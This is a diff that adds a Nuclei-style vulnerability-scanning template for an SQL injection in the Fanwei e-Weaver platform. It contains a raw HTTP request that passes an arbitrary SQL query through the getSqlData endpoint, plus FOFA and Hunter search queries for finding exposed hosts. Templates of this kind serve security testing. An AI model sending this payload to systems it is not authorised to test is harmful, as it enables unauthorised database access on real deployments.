@@ -1,0 +1,30 @@
+id: weaver_sql
+info:
+  name: 泛微e-Weaver SQL注入
+  author: mike
+  severity: info
+  description: 泛微e-Weaver（FANWEI e-Weaver）是一款广泛应用于企业数字化转型领域的集成协同管理平台。作为中国知名的企业级软件解决方案提供商，泛微软件（广州）股份有限公司开发和推广了e-Weaver平台。
+  reference: xxx
+  remediation: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="泛微-E-Weaver"
+    hunter-query: app.name="泛微 e-Weaver"
+http:
+  - raw:
+      - |
+        GET /Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version HTTP/1.1
+        Host: {{Hostname}}  
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "true"
